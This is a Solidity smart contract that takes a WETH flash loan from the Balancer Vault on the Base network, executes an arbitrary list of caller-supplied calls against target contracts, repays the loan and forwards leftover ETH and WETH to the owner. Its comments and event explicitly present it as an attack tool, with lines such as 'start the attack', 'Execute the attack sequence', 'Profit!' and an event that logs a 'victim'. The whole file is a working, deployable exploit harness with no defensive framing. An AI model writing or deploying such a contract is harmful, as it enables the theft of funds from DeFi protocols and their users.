// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract FlashLoanExecutor is IFlashLoanRecipient {
    // Balancer Vault on Base
    IVault public constant vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    // WETH on Base
    address public constant WETH = 0x4200000000000000000000000000000000000006;
    
    address public owner;

    event FlashLoanExecuted(address indexed victim, uint256 amount, uint256 profit);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    // Call this function to start the attack
    function executeWithFlashLoan(
        address[] calldata targets,
        bytes[] calldata payloads,
        uint256[] calldata values,
        uint256 loanAmount
    ) external onlyOwner {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanAmount;

        // Encode targets, payloads, values
        bytes memory userData = abi.encode(targets, payloads, values);

        // Initiate Flash Loan
        vault.flashLoan(this, tokens, amounts, userData);
    }

    // Callback from Balancer
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == address(vault), "Not Vault");

        (address[] memory targets, bytes[] memory payloads, uint256[] memory values) = abi.decode(userData, (address[], bytes[], uint256[]));
        
        uint256 amountOwed = amounts[0] + feeAmounts[0];
        IWETH weth = IWETH(WETH);

        // 1. Unwrap WETH to ETH to perform the attack with raw ETH
        weth.withdraw(amounts[0]);

        // 2. Execute the attack sequence
        for (uint i = 0; i < targets.length; i++) {
            uint256 val = values[i];
            if (val == type(uint256).max) {
                val = address(this).balance;
            }
            (bool success, ) = targets[i].call{value: val}(payloads[i]);
            require(success, "Attack step failed");
        }

        // 3. Repay logic
        uint256 balance = address(this).balance;
        uint256 wethBalance = weth.balanceOf(address(this));
        
        // Wrap ETH needed for repayment
        if (wethBalance < amountOwed) {
            uint256 needed = amountOwed - wethBalance;
            require(balance >= needed, "Insufficient funds to repay Flash Loan");
            weth.deposit{value: needed}();
        }

        // 4. Repay Balancer
        IERC20(tokens[0]).transfer(address(vault), amountOwed);

        // 5. Profit!
        // Transfer remaining ETH to owner
        uint256 profitEth = address(this).balance;
        if (profitEth > 0) {
            (bool s, ) = owner.call{value: profitEth}("");
            require(s, "ETH Profit transfer failed");
        }
        
        // Transfer remaining WETH to owner
        uint256 profitWeth = weth.balanceOf(address(this));
        if (profitWeth > 0) {
            weth.transfer(owner, profitWeth);
        }
        
        emit FlashLoanExecuted(targets[0], amounts[0], profitEth + profitWeth);
    }

    // Accept ETH
    receive() external payable {}
}
